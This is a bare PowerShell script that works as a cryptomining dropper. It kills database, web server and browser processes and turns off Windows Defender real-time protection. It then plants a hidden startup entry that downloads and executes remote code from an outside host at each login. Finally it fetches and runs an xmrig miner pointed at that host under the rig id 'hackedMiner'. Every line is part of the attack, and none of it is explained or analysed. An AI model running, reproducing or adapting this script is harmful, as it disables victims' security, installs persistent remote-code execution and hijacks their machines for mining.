taskkill /IM sqlservr.exe /F
taskkill /IM w3wp.exe /F
taskkill /IM msedge.exe /F
taskkill /IM Batch.exe /F
Set-MpPreference -DisableRealtimeMonitoring $true
Write-Output 'cmd /c start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass "irm http://lucasz228.us.to:50000/getminer | iex"' > "$Env:USERPROFILE\Start Menu\Programs\Startup\run.cmd"
Invoke-WebRequest "https://raw.githubusercontent.com/zlc1003/miner/main/miner.zip" -OutFile $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip
Expand-Archive $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner.zip -DestinationPath $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner -Force
Set-Location $Env:HOMEDRIVE$Env:HOMEPATH\Downloads\miner\miner
./xmrig.exe -o lucasz228.us.to:9200 --rig-id hackedMiner
